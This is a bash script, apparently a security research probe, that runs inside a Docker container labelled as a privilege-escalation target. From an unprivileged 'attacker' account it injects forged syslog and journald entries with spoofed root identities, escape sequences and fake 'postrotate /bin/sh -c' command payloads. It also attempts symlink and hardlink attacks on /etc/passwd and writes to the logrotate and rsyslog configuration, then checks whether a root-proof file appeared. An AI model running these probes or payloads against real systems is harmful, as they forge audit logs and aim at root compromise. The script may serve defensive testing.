#!/usr/bin/env bash
set -euo pipefail

TARGET="${1:-ubuntu24-server-lpe-target}"
TAG="${TAG:-RSJLD_$(date -u +%Y%m%d%H%M%S)_$$}"

docker exec -i -e TAG="$TAG" "$TARGET" bash -s <<'TARGET_SCRIPT'
set -u

TAG="${TAG:?missing TAG}"
ROOT_PROOF="/root/${TAG}_root_proof"

log() {
  printf '\n## %s\n' "$*"
}

run_attacker() {
  runuser -u attacker -- env TAG="$TAG" ROOT_PROOF="$ROOT_PROOF" bash -lc "$1"
}

log "baseline: target, packages, units"
printf 'tag=%s\n' "$TAG"
sed -n 's/^PRETTY_NAME=/PRETTY_NAME=/p' /etc/os-release
id attacker
printf 'attacker_groups='
id -nG attacker
dpkg-query -W -f='${db:Status-Abbrev}\t${binary:Package}\t${Version}\n' \
  rsyslog systemd logrotate cron bsd-mailx mailutils postfix util-linux 2>&1 || true
printf '\n-- daemon versions --\n'
rsyslogd -v | sed -n '1,12p' || true
/lib/systemd/systemd --version | sed -n '1,6p' || true
logrotate --version || true
printf '\n-- active/default units --\n'
systemctl is-system-running || true
systemctl list-units --all --no-pager \
  rsyslog.service systemd-journald.service logrotate.service logrotate.timer \
  syslog.socket systemd-journald.socket systemd-journald-dev-log.socket 2>&1 || true
systemctl list-unit-files --no-pager \
  rsyslog.service systemd-journald.service logrotate.service logrotate.timer \
  syslog.socket systemd-journald.socket systemd-journald-dev-log.socket 2>&1 || true
systemctl list-sockets --all --no-pager | grep -E 'syslog|journal|dev-log' || true

log "runtime privilege and filesystem boundary"
for p in /usr/sbin/rsyslogd /usr/lib/systemd/systemd-journald /usr/sbin/logrotate \
  /dev/log /run/systemd/journal/dev-log /run/systemd/journal/socket \
  /run/systemd/journal/stdout /run/systemd/journal/syslog \
  /etc/rsyslog.conf /etc/rsyslog.d /etc/logrotate.conf /etc/logrotate.d \
  /var/lib/logrotate /var/lib/logrotate/status /var/spool/rsyslog \
  /run/log /run/log/journal /var/log /var/log/journal \
  /var/log/syslog /var/log/auth.log /var/log/kern.log /var/log/mail.log \
  /var/log/mail.err /var/log/ufw.log; do
  [ -e "$p" ] || [ -L "$p" ] || continue
  stat -Lc '%F %A %U:%G %n' "$p" 2>/dev/null || ls -ld "$p"
done
printf '\n-- process credentials --\n'
for pid in $(pidof rsyslogd systemd-journald 2>/dev/null || true); do
  printf '\n/proc/%s/status\n' "$pid"
  awk '/^(Name|Uid|Gid|Groups|CapEff|NoNewPrivs):/ {print}' "/proc/$pid/status"
done
sysctl fs.protected_symlinks fs.protected_hardlinks fs.protected_regular fs.protected_fifos 2>/dev/null || true

log "rsyslog config: templates/actions and parser validation"
rsyslogd -N1 2>&1 | sed -n '1,120p' || true
printf '\n-- default rsyslog config excerpts --\n'
sed -n '1,130p' /etc/rsyslog.conf
for f in /etc/rsyslog.d/*.conf; do
  [ -e "$f" ] || continue
  printf '\n-- %s --\n' "$f"
  sed -n '1,160p' "$f"
done
printf '\n-- dynamic or executable rsyslog action grep --\n'
grep -RsnE '(template\(|dynaFile|omprog|ompipe|action\(|\$Action|\$ModLoad|:omusrmsg:|/var/log)' \
  /etc/rsyslog.conf /etc/rsyslog.d /usr/share/rsyslog 2>/dev/null | sed -n '1,240p' || true

log "logrotate config: state, lock, create, copytruncate, scripts, mail hooks"
sed -n '1,140p' /etc/logrotate.conf
for f in /etc/logrotate.d/*; do
  [ -f "$f" ] || continue
  printf '\n-- %s --\n' "$f"
  sed -n '1,120p' "$f"
done
printf '\n-- directive grep --\n'
grep -RsnE '^[[:space:]]*(mail|mailfirst|maillast|nomail|create|copytruncate|copy|renamecopy|olddir|su|sharedscripts|postrotate|prerotate|firstaction|lastaction|shred|compresscmd|uncompresscmd|dateext|include)\b' \
  /etc/logrotate.conf /etc/logrotate.d 2>/dev/null | sed -n '1,240p' || true
printf '\n-- mail/reporting command availability --\n'
for c in mail mailx sendmail; do
  command -v "$c" 2>/dev/null && "$c" --version 2>&1 | sed -n '1,4p' || true
done
ls -l /usr/bin/mail /usr/bin/mailx /usr/sbin/sendmail 2>/dev/null || true

rm -f "$ROOT_PROOF"

log "uid1001 realistic ingress: logger, imuxsock, native journal, stdout stream"
run_attacker 'logger -p authpriv.warning -t "sudo[1]" "${TAG}_LOGGER_AUTHPRIV rootcmd=id>${ROOT_PROOF}"'
run_attacker 'logger -p user.emerg -t "wallroot" "${TAG}_EMERG_OMUSRMSG $(printf "\033[31m")root-looking broadcast$(printf "\033[0m")"'
run_attacker 'python3 - <<PY
import os, socket, time
tag = os.environ["TAG"]
root_proof = os.environ["ROOT_PROOF"]
payload = (
    f"<85>May 16 12:00:00 fakehost sshd[222]: {tag}_DEVLOG line1\\n"
    f"postrotate\\n\\t/bin/sh -c '\''id > {root_proof}'\''\\nendscript "
    "ESC=\\x1b[31mRED\\x1b[0m NUL=\\x00 [UFW BLOCK]"
).encode("utf-8", "surrogateescape")
for path in ("/dev/log", "/run/systemd/journal/syslog"):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
    s.sendto(payload.replace(b"_DEVLOG", ("_" + path.rsplit("/", 1)[-1]).encode()), path)
    s.close()
time.sleep(0.2)
PY'
run_attacker 'cat <<EOF | logger --journald
MESSAGE=${TAG}_JOURNALD_NATIVE newline1
PRIORITY=5
SYSLOG_FACILITY=10
SYSLOG_IDENTIFIER=sudo
MESSAGE_ID=fc2e22bc6ee647b6b90729ab34a250b1
_PID=1
_UID=0
_GID=0
_COMM=systemd
OBJECT_PID=1
CODE_FILE=/etc/logrotate.d/rsyslog
EOF'
run_attacker 'systemd-cat -t roothelper -p warning sh -c "printf \"%s\\n%s\\n\" \"${TAG}_SYSTEMD_CAT line1\" \"May 16 fakehost root[1]: /bin/sh -c id > ${ROOT_PROOF}\""'
run_attacker 'python3 - <<PY
import os, socket, time
tag = os.environ["TAG"]
root_proof = os.environ["ROOT_PROOF"]
msg = (
    "roothelper\\n"
    "sshd.service\\n"
    "3\\n"
    "0\\n"
    "1\\n"
    "0\\n"
    "0\\n"
    f"{tag}_RAW_STDOUT line1\\n"
    f"May 16 fakehost root[1]: /bin/sh -c id > {root_proof}\\n"
)
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/run/systemd/journal/stdout")
s.sendall(msg.encode())
time.sleep(0.2)
s.close()
PY'

sleep 1

log "materialized log evidence"
for path in /var/log/auth.log /var/log/syslog /var/log/kern.log /var/log/mail.log /var/log/mail.err /var/log/ufw.log; do
  [ -e "$path" ] || continue
  printf '\n-- %s --\n' "$path"
  grep -a "$TAG" "$path" | tail -n 30 || true
  stat -c '%A %U:%G %n' "$path" || true
done

log "journal trusted fields for probe entries"
journalctl --no-pager -o export -g "$TAG" | \
  awk '/^(MESSAGE|_UID|_GID|_PID|_COMM|_EXE|_TRANSPORT|_SYSTEMD_UNIT|SYSLOG_IDENTIFIER|SYSLOG_FACILITY|PRIORITY|MESSAGE_ID|OBJECT_PID|CODE_FILE)=/ { print } /^$/ { print "" }' | \
  sed -n '1,260p' || true

log "uid1001 filesystem and control-trigger attempts"
run_attacker 'set +e
for cmd in \
  "touch /var/log/${TAG}_create" \
  "ln /etc/passwd /var/log/${TAG}_hardlink" \
  "ln -s /etc/passwd /var/log/${TAG}_symlink" \
  "truncate -s 0 /var/log/syslog" \
  "touch /run/log/${TAG}_runlog_create" \
  "touch /run/log/journal/${TAG}_journal_create" \
  "touch /var/spool/rsyslog/${TAG}_spool_create" \
  "touch /etc/logrotate.d/${TAG}.conf" \
  "touch /etc/rsyslog.d/${TAG}.conf" \
  "printf x >> /var/lib/logrotate/status" \
  "systemctl start logrotate.service" \
  "systemctl kill -s HUP rsyslog.service"; do
    printf "$ %s\n" "$cmd"
    bash -lc "$cmd" 2>&1
    printf "rc=%s\n" "$?"
done
printf "\n-- direct uid1001 logrotate with stock config --\n"
logrotate -d /etc/logrotate.conf 2>&1 | sed -n "1,90p"
printf "attacker_logrotate_debug_rc=%s\n" "${PIPESTATUS[0]}"'

log "root debug of stock logrotate plan"
logrotate -d -f /etc/logrotate.conf 2>&1 | \
  grep -Ea 'warning:|reading config file|including /etc/logrotate.d|Reading state|rotating pattern:|copytruncate|renaming /var/log|creating new /var/log|compressing log|running postrotate|not running postrotate|/usr/lib/rsyslog/rsyslog-rotate|switching euid|error:' | \
  sed -n '1,260p' || true

log "root proof and cleanup check"
if [ -s "$ROOT_PROOF" ]; then
  printf 'ROOT_PROOF=YES\n'
  sed -n '1,20p' "$ROOT_PROOF"
else
  printf 'ROOT_PROOF=NO\n'
fi
find /tmp /var/tmp /var/log /run/log /etc/logrotate.d /etc/rsyslog.d /var/spool/rsyslog \
  -maxdepth 2 \( -name "${TAG}*" -o -lname "*${TAG}*" \) -ls 2>/dev/null || true
systemctl is-system-running || true
systemctl is-active rsyslog.service systemd-journald.service logrotate.timer || true
systemctl --failed --no-pager || true
TARGET_SCRIPT
